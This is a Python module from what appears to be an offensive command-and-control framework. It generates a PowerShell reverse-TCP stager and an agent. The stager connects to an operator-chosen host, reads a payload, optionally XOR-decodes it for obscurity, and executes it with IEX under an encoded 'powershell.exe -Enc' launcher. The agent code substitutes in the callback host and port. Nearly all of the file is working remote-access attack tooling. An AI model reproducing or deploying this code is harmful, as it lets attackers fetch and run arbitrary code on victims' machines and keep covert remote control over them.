
from helpers.log import *
import helpers.strings as helps
import helpers.encryption as encryption
from ..platform import Platform
from helpers.modulebase import ModuleBase
import os.path

DEBUG_MODULE = "PlatformPowershell"
MAX_AGENT_LEN = 102400 # TODO: choose shorter value, when done writing agent => faster staging

# TODO: for STAGEAUTHENTICATION
#SIGNATURE_ALGO = "SHA512"
#TEST_PUBLICKEY_XML = "<RSAKeyValue><Modulus>w0rhv1bFdln+bHgBkGU7QbI2Hv47aG4ey6vSlD7NsgCuj1gBzEe3moNe6e/Ml1AGUFpMSPE/yFKrYgZvNf/6dBAvkR/twLvQW+I/yKcnpV1stv0/AiZvFP6kXpdPpNeEYQtt+Hn829UQsoTjOfOjcKgrNdtvENmb9oJMhZeFmjHrJ7JL/nIcvGRBaNCuIqnF2VqPzSgGA5zWrFqhCO2Tb4l4eouPtofYa/aocuMbYuw/zkBS+fju647c1ZaE6neJs7newZ/gNYPRx2vHFVLaFlPRSwUMipNifXyZ9o5CizLndym1WCm+YlQ6Bj/r8N/nPnR3x0MA4ePuL41NfTemWnLRa9vWJVoXHwXjaHQcw8G2J8j4oxMoU8Egy8PSYetXpFg6W657vX1PhDjNS5mfmbBV+8XJT5M+Plb1C8dnaHMWtcW7krMByIUH7oWEWliAtuctZdhc345/Z4DABmOPGe40roYZxi+L4xDIsZGjrS0zMHWdahh98Nd1PnnGKsS48nOXFhwpFivXsRcBqEDUHG0U2glFFb1hRGAzwvetDMxkjRVU2Dq3dRF51jGNRxQp7FXdL9DdAbWzK/ELnUXbZpnGlx1WdGHumGUTIQ+oC/J1imo7UwfCHK0M7lJTDPnbYV7jRbmsqfEqx5CvN2joNt2NdwYqram1KqMuVKYlxaM=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"

class PlatformPowershell(Platform, ModuleBase):
    """
    platform code to provide a stager and an agent generator for powershell
    """

    def __init__(self):
        """
        powershell plattform code
        """

        self.options = {
            'STAGED' : {
                'Description'   :   'Is the communication setup staged or not?',
                'Required'      :   True,
                'Value'         :   "TRUE",
                'Options'       :   ("TRUE", "FALSE")
            },
            'STAGEENCODING' : {
                'Description'   :   'Should we send the staged agent in an encoded form (obscurity, not for security!)',
                'Required'      :   True,
                'Value'         :   "TRUE",
                'Options'       :   ("TRUE", "FALSE")
            },
            'STAGEENCODINGKEY' : {
                'Description'   :   'Ascii-based key to use for the encoded staged agent (will be generated automatically if not set when generating stage, required for generating agent)',
                'Required'      :   False,
                'Value'         :   None
            },
            'STAGEAUTHENTICATION' : {
                'Description'   :   'Should the stager verify the agent code before executing (RSA signature verification with certificate pinning)',
                'Required'      :   True,
                'Value'         :   "FALSE",
                'Options'       :   ("FALSE") # TODO: Currently not implemented
            }
        }
        self.platformpath = os.path.abspath(os.path.dirname(__file__))

    def isstaged(self):
        """
        powershell platform can be staged by setting the option
        """

        return (self.options['STAGED']['Value'] == "TRUE")
    
    def _generatestageencodingkey(self):
        import string
        return helps.random_string(length=32, charset=string.ascii_letters+string.digits)

    def getstager(self, handler):
        """
        Generate the stager string
        """

        if not self.isstaged():
            print_error("Platform is not staged. Consider changing option STAGED or generating agent directly.")
            return None
        if not handler.transport:
            print_error("Transport not set")
            return None

        # generate powershell + reversetcp stager
        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            ip = handler.transport.options['CONNECTHOST']['Value'] or handler.transport.options['LHOST']['Value']
            if ip == "0.0.0.0":
                print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                return None
            port = handler.transport.options['CONNECTPORT']['Value'] or handler.transport.options['LPORT']['Value']
            print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))
            # TODO: Consider using helps.randomize_capitalization(...)
            stager = '$c=New-Object net.sockets.TcpClient("{}",{});'.format(ip,port)
            stager += '$a=New-Object char[]({});'.format(MAX_AGENT_LEN)
            stager += '$r=New-Object IO.StreamReader($c.GetStream());'
            stager += '$b=$r.Read($a,0,{});'.format(MAX_AGENT_LEN)

            # for stage encoding, include key and decoding algorithm here
            if self.options['STAGEENCODING']['Value'] == "TRUE":
                # if not set, generate an encoding key first
                if not self.options['STAGEENCODINGKEY']['Value']:
                    self.options['STAGEENCODINGKEY']['Value'] = self._generatestageencodingkey()
                key = self.options['STAGEENCODINGKEY']['Value']
                stager += '$k="{}";'.format(key)
                stager += '$a=$a|%{$_-bXor$k[$i++%$k.Length]};'

            # for stage authentication, include fingerprint and verification code here
            #if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
                # $fingerprint=PUBLICKEYFP
                # TODO: split data in code, publickey, signature
                # $x=New-Object Security.Cryptography.RSACryptoServiceProvider(4096)
                # $x.FromXmlString($pk);
                # $x.VerifyData("staticvalue".ToCharArray(),"SHA512",$fingerprint)
                # $x.VerifyData($data,"SHA512",$sig)

                # TO CREATE SIGNATURE FOR TESTING:
                # $pk=$x.ToXmlString(0)
                # $sig=$x.SignData($a, "SHA512")
            
            stager += '$s=New-Object String($a,0,$b);'
            stager += 'IEX $s;'
            print_debug(DEBUG_MODULE, "stager = {}".format(stager))
            return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ") # TODO: baseCmd

        # combination platform / transport currently not supported 
        else:
            print_error("No stager for platform and transport found.")
            return None

    def getagent(self, handler):
        """
        Generate the full powershell agent string for this setup if possible
        """

        print_debug("DEBUG_MODULE", "platformpath = {}".format(self.platformpath))
        agent = ""

        # add selected transport implementation
        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            f = open(self.platformpath + "/transport/reversetcp.ps1", 'r')

        # combination platform / transport currently not supported 
        else:
            print_error("No agent module for platform and transport found.")
            return None
        agent += f.read()
        f.close()

        # add message basics
        f = open(self.platformpath + "/message/message.ps1", 'r')
        agent += f.read()
        f.close()
        
        # add agent base code
        f = open(self.platformpath + "/agent.ps1", 'r')
        agent += f.read()
        f.close()

        # strip comments and empty lines
        agent = helps.strip_powershell_comments(agent)

        # get and replace some values
        if handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            ip = handler.transport.options['CONNECTHOST']['Value'] or handler.transport.options['LHOST']['Value']
            if ip == "0.0.0.0":
                print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                return None
            port = handler.transport.options['CONNECTPORT']['Value'] or handler.transport.options['LPORT']['Value']
            print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))

            agent = agent.replace('SYREPLACE_CONNECTIONMETHOD', "TCP")
            agent = agent.replace('SYREPLACE_CONNECTHOST', str(ip))
            agent = agent.replace('SYREPLACE_CONNECTPORT', str(port))

        # combination platform / transport currently not supported 
        else:
            print_error("No agent module for platform and transport found.")
            return None

        # TODO: stage authentication

        # encode agent with STAGEENCODINGKEY if active
        if self.isstaged() and self.options['STAGEENCODING']['Value'] == "TRUE":
            if not self.options['STAGEENCODINGKEY']['Value']:
                print_error("cannot encode agent, since STAGEENCODING is active but no STAGEENCODINGKEY set. Set STAGEENCODINGKEY according to the value in the stager or generate a new stager and thus a new key aswell.")
                return None
            else:
                agent = encryption.xor_encode(agent, self.options['STAGEENCODINGKEY']['Value'])

        if len(agent) > MAX_AGENT_LEN and self.isstaged():
            print_error("agent is longer than stager buffer, staging will fail")
        return agent

